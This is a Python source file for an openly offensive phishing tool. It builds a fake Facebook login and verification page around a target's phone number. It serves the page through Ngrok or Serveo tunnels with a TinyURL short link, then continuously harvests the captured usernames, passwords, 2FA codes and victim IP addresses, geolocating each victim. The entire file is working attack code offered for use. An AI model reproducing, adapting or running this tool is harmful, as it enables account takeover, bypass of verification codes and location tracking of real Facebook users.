#!usr/bin/env python3.7

import time
import os
import sys
from sys import argv
import re
import json
import multiprocessing
import requests
from base.Configurations import *

from urllib.request import urlopen
from subprocess import check_output, CalledProcessError

import subprocess
import threading

from data.index import *
BLUE = "\033[1;34m"
RED = "\033[1;31m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;96m"
RESET = "\033[0m"
PINK = "\033[1;95m"
WHITE = '\033[46m'
os.system('resize -s 20 72 > /dev/null &')

config = readConfig()
logFile = None
didBackground = config.get("Settings","DidBackground")
for arg in argv:
    if arg=="--nolog": #If true - don't log
        didBackground = False
if config.get("Settings", "DidBackground") == "True":
    os.system('touch log.txt && chmod 777 log.txt') 
    logFile = open("log.txt", "w")


def clear():
    os.system("clear")
def banner():
    print(RED+"██ ▄█▀ ███▄    █  ██▓  ▄████  ██░ ██ ▄▄▄█████▓  ██████ ▓█████  ▄████▄"+RESET)
    print(RED+"██▄█▒  ██ ▀█   █ ▓██▒ ██▒ ▀█▒▓██░ ██▒▓  ██▒ ▓▒▒██    ▒ ▓█   ▀ ▒██▀ ▀█"+RESET)
    print(RED+"▓███▄░ ▓██  ▀█ ██▒▒██▒▒██░▄▄▄░▒██▀▀██░▒ ▓██░ ▒░░ ▓██▄   ▒███   ▒▓█    ▄"+RESET)
    print(RED+"▓██ █▄ ▓██▒  ▐▌██▒░██░░▓█  ██▓░▓█ ░██ ░ ▓██▓ ░   ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒"+RESET)
    print(RED+"▒██▒ █▄▒██░   ▓██░░██░░▒▓███▀▒░▓█▒░██▓  ▒██▒ ░ ▒██████▒▒░▒████▒▒ ▓███▀ ░"+RESET)
    print(RED+"▒ ▒▒ ▓▒░ ▒░   ▒ ▒ ░▓   ░▒   ▒  ▒ ░░▒░▒  ▒ ░░   ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░"+RESET)
    print(RED+"░ ░▒ ▒░░ ░░   ░ ▒░ ▒ ░  ░   ░  ▒ ░▒░ ░    ░    ░ ░▒  ░ ░ ░ ░  ░  ░  ▒"+RESET)
    print(RED+"   ▒ ▒░         ▒        ░  ▒  ░    ░           ░  ░     ▒"+RESET)
    print("\n")
    time.sleep(0.35)
#Animation copied from Kickthemout#not used
def CYANAnimation(text):
    try:
        global stopCYANAnimation
        i = 0
        while stopCYANAnimation is not True:
            tempText = list(text)
            if i >= len(tempText):
                i = 0
            tempText[i] = tempText[i].upper()
            tempText = ''.join(tempText)
            sys.stdout.write(CYAN + tempText + '\r' + RESET)
            sys.stdout.flush()
            i += 1
            time.sleep(0.1)
    except:
        os._exit(1)
def PINKAnimation(text):
    try:
        global stopPINKAnimation
        i = 0
        while stopPINKAnimation is not True:
            tempText = list(text)
            if i >= len(tempText):
                i = 0
            tempText[i] = tempText[i].upper()
            tempText = ''.join(tempText)
            sys.stdout.write(PINK + tempText + '\r' + RESET)
            sys.stdout.flush()
            i += 1
            time.sleep(0.1)
    except:
        os._exit(1)
#not used        
def YELLOWAnimation(text):
    try:
        global stopYELLOWAnimation
        i = 0
        while stopYELLOWAnimation is not True:
            tempText = list(text)
            if i >= len(tempText):
                i = 0
            tempText[i] = tempText[i].upper()
            tempText = ''.join(tempText)
            sys.stdout.write(YELLOW + tempText + '\r' + RESET)
            sys.stdout.flush()
            i += 1
            time.sleep(0.1)
    except:
        os._exit(1)
def sergrok():
    clear()
    banner()
    time.sleep(0.35)
    print(CYAN +"1.Serveo\n2.Ngrok\n9.Exit"+RESET)
    print("")
    choose_sk = input(PINK+"Choose > "+RESET)
    try:
        int(choose_sk)
    except ValueError:
        sergrok()
    try:
        if int(choose_sk) == 9:
            exit()
        if int(choose_sk) == 1:
        
            runServeo()
        elif int(choose_sk) == 2:
        
            runNgrok()
    
    except ValueError:
        sergrok()
def runServer():
    os.system("cd SERVER && php -S 127.0.0.1:8877 > /dev/null 2>&1 &")
def facebook():
    clear()
    banner()
    global stopPINKAnimation
    stopPINKAnimation = False

    phone = input(YELLOW+"Target's Phone Number (with country tag) -> "+RESET)
    t = threading.Thread(target=PINKAnimation, args=('Preparing Phone number...',))
    t.daemon = True
    t.start()
   
    time.sleep(3)
    stopPINKAnimation = True
    os.system("rm -r SERVER/")

    subprocess.call(['mkdir','-p','SERVER/'])

    filedata = str(Main_Facebook)
    filedata = filedata.replace('[phone]', str(phone))

    with open('./SERVER/verify.html', 'w') as file:
            file.write(filedata)
    file.close()
#i could use copy_tree but i was too lazy to write less #NOSENSE
    os.system("cp WebPages/facebook/login.php SERVER/")
    os.system("cp WebPages/facebook/mobile.html SERVER/")
    os.system("cp WebPages/facebook/index.html SERVER/")
    os.system("cp WebPages/facebook/verifycode.php SERVER/")
    os.system("cp WebPages/ip.php SERVER/ && touch SERVER/usernames.txt && touch SERVER/ip.txt && touch SERVER/code.txt")

   
    os.system("chmod -R 777 SERVER/")

    time.sleep(2)
    sergrok()
def main():
    clear()
    banner()
    time.sleep(0.35)
    print((RED+"1.""{0}Advanced Spare Phishing{1}\n"+RED+"9.""{0}Exit{1}\n").format(YELLOW, RESET))
    print("")
    choice = input(PINK+"Choose > " +RESET)
    if not choice.isdigit():
        main()
    else:
        choice = int(choice)
    try:
        int(choice)
    except ValueError:
        main()
    try:
        if int(choice) == 0:
            print("")
            print (RED+"Exiting... "+RESET)
            time.sleep(1)
            exit()
        if int(choice) == 1:
            
            facebook()
            
        elif int(choice) == 9:
            exit()
        else:
            main()
    except ValueError:
        main()
def runNgrok():
    os.system('cd SERVER/ && ngrok http 8877 > /dev/null &')
    while True:
        time.sleep(2)
        os.system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
        urlFile = open('ngrok.url', 'r')
        url = urlFile.read()
        urlFile.close()
        if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
            print("\n {0}[{1}*{0}]{1} Ngrok URL: {2}".format(RED, RESET, BLUE) + url + "{1}".format(RED, RESET, BLUE))
            link = check_output("curl -s 'http://tinyurl.com/api-create.php?url='"+url, shell=True).decode().replace('http', 'https')
            print("\n {0}[{1}*{0}]{1} Shorten URL: {2}".format(RED, RESET, BLUE) + link + "{1}".format(RED, RESET, BLUE))
            print("\n")
            os.system("rm -Rf ngrok.url")
            break
            continue
        #Script semi-copied from DarksecDevelopers!


def runServeo():
    link1 = input(("\n {0}Custom Subdomain name ->  {1}").format(RED, RESET))
    if not ".serveo.net" in link1:
        link1 += ".serveo.net"
    else:
        pass
    os.system('cd SERVER/')
    os.system('ssh -R %s:80:localhost:8877 serveo.net > link.url 2> /dev/null &' % (link1))
    while True:
       
            time.sleep(2)
            os.system('cat link.url | grep "https://[0-9a-z]*\.serveo.net" -oh > serveo.url')
            urlFile = open('serveo.url', 'r')
            url = urlFile.read()
            urlFile.close()
            if re.match("https://[0-9a-z]*\.serveo.net", url) != None:
                print("\n {0}[{1}*{0}]{1} Serveo URL: {2}".format(RED, RESET, BLUE) + url + "{1}".format(RED, RESET, BLUE))
                os.system("rm -Rf link.url, serveo.url")
                break
                continue

        
    
#CREDGET IS FROM HIDDENEYE COPIED 100/100 - sorry...
def credget():
    print("Getting creds!")
    while True:
        with open('SERVER/usernames.txt') as credkey:
            cred_line = credkey.read().rstrip()
            if len(cred_line) != 0:
                writeLog('{0}______________________________________________________________________{1}'.format(RED, RESET))
                writeLog((' {0}[ CREDENTIALS FOUND ]{1}:\n {0}{2}{1}').format(BLUE, RESET, cred_line))
                os.system('rm -rf SERVER/usernames.txt && touch SERVER/usernames.txt')
                writeLog('{0}______________________________________________________________________{1}'.format(RED, RESET))

        credkey.close()


        with open('SERVER/ip.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
                user = re.match('Current logged in user: (a-z0-9)\n', lines)
                resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                if 'bogon' in ipinfo:
                    log('======================================================================'.format(RED, RESET))
                    log((' \n{0}[ VICTIM IP BONUS ]{1}:\n {0}{2}{1}').format(BLUE, RESET, lines))
                else:
                    matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
                    latitude = matchObj.group(1)
                    longitude = matchObj.group(2)
                    writeLog('======================================================================'.format(RED, RESET))
                    writeLog((' \n{0}[ VICTIM INFO FOUND ]{1}:\n {0}{2}{1}').format(BLUE, RESET, lines))
                    writeLog((' \n{0}Longitude: {2} \nLatitude: {3}{1}').format(BLUE, RESET, longitude, latitude))
                    writeLog((' \n{0}ISP: {2} \nCountry: {3}{1}').format(BLUE, RESET, ipinfo['org'], ipinfo['country']))
                    writeLog((' \n{0}Region: {2} \nCity: {3}{1}').format(BLUE, RESET, ipinfo['region'], ipinfo['city']))
                os.system('rm -rf SERVER/ip.txt && touch SERVER/ip.txt')
                writeLog('======================================================================'.format(RED, RESET))

        creds.close()

        with open('SERVER/code.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                writeLog('{0}______________________________________________________________________{1}'.format(RED, RESET))
                writeLog((' {0}[ GETTING THE CODE ]{1}:\n {0}%s{1}').format(BLUE, RESET) % lines)
                os.system('rm -rf SERVER/code.txt && touch SERVER/code.txt')
                writeLog('{0}______________________________________________________________________{1}'.format(RED, RESET))


        creds.close()
    
def writeLog(ctx): #Writing log
    if config.get("Settings", "DidBackground") == "True": #if didBackground == True, write
        logFile.write(ctx.replace(RED, "").replace(WHITE, "").replace(CYAN, "").replace(BLUE, "").replace(RESET, "") + "\n")
    print(ctx)    









if __name__ == "__main__":
    try:
        main()
        
        multiprocessing.Process(target=runServer).start()
        credget()
    except KeyboardInterrupt:
        print("")
        print (RED+"Exiting... "+RESET)
        time.sleep(1)
        os.system("pkill -9 ngrok")
        os.system("pkill -9 php")
        exit()
    


